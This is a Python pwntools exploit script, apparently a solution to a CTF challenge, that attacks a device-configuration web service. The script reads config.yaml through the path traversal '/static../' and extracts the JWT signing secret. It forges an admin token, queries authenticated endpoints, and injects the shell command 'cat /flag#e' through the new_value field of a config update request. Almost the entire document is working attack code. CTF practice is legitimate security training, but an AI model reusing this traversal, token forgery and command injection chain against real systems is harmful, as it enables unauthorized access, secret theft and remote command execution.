#!/usr/bin/env python3
from pwn import *

import base64
import hashlib
import hmac
import json
import os
import re


context(arch='amd64', os='linux', log_level='debug')

HOST = args.HOST or '80-6a27fbbd-88a1-4936-9b8a-854708e4d40a.challenge.ctfplus.cn'
PORT = int(args.PORT or 80)
BIN = './pwn'


def start():
    if args.LOCAL and os.path.exists(BIN):
        io = process(BIN)
    else:
        io = remote(HOST, PORT)
    return io


def b64url(x):
    return base64.urlsafe_b64encode(x).rstrip(b'=')


def jwt_hs256(data, key):
    head = b64url(json.dumps({'alg': 'HS256', 'typ': 'JWT'}, separators=(',', ':')).encode())
    body = b64url(json.dumps(data, separators=(',', ':')).encode())
    sig = b64url(hmac.new(key.encode(), head + b'.' + body, hashlib.sha256).digest())
    return b'.'.join([head, body, sig]).decode()


def build_req(method, path, body=b'', headers=None):
    if isinstance(body, dict):
        body = json.dumps(body, separators=(',', ':')).encode()
        headers = dict(headers or {})
        headers['Content-Type'] = 'application/json'
    elif isinstance(body, str):
        body = body.encode()

    headers = dict(headers or {})
    headers['Host'] = HOST if PORT == 80 else f'{HOST}:{PORT}'
    headers['Connection'] = 'close'
    headers['Content-Length'] = str(len(body))

    req = [f'{method} {path} HTTP/1.1']
    for k, v in headers.items():
        req.append(f'{k}: {v}')
    req.append('')
    req.append('')
    return '\r\n'.join(req).encode() + body


def recv_http(io):
    head = io.recvuntil(b'\r\n\r\n')
    code = int(re.search(rb'HTTP/\d\.\d (\d+)', head).group(1))
    m = re.search(rb'Content-Length:\s*(\d+)', head, re.I)
    if m:
        body = io.recvn(int(m.group(1)))
        return code, head, body
    if b'Transfer-Encoding: chunked' in head:
        body = b''
        while True:
            size = int(io.recvline().strip(), 16)
            if not size:
                io.recvline()
                break
            body += io.recvn(size)
            io.recvline()
        return code, head, body
    body = io.recvrepeat(0.2)
    return code, head, body


def http(method, path, body=b'', headers=None):
    io = start()
    io.send(build_req(method, path, body, headers))
    code, head, data = recv_http(io)
    io.close()
    return code, head, data


def extract_secret(data):
    return re.search(rb'^\s*jwt_secret\s*:\s*"?(.*?)"?\s*$', data, re.M).group(1).decode()


def main():
    code, _, data = http('GET', '/static../app/config.yaml')
    success(f'/static../app/config.yaml -> {code}')
    if code != 200:
        log.failure(data.decode(errors='ignore'))
        return

    print(data.decode())
    secret = extract_secret(data)
    success(f'jwt_secret = {secret}')

    token = jwt_hs256({'user': 'admin', 'role': 'admin'}, secret)
    headers = {'Authorization': f'Bearer {token}'}

    for path in ['/api/config/list', '/api/config/view?device_id=cam-01', '/api/logs?level=ERROR']:
        code, _, data = http('GET', path, headers=headers)
        success(f'{path} -> {code}')
        print(data.decode(errors='ignore'))

    io = start()
    # gdb.attach(io, 'b *main\nc')
    io.send(build_req(
        'POST',
        '/api/config/update',
        {
            'device_id': 'cam-01',
            'old_value': 'DefaultSSID',
            'new_value': 'cat /flag#e',
        },
        headers,
    ))
    code, _, data = recv_http(io)
    io.close()

    success(f'/api/config/update -> {code}')
    print(data.decode(errors='ignore'))

    flag = re.search(rb'polarisctf\{[^}\n]+\}', data)
    if not flag:
        log.failure('flag not found')
        return
    success(flag.group(0).decode())


if __name__ == '__main__':
    main()
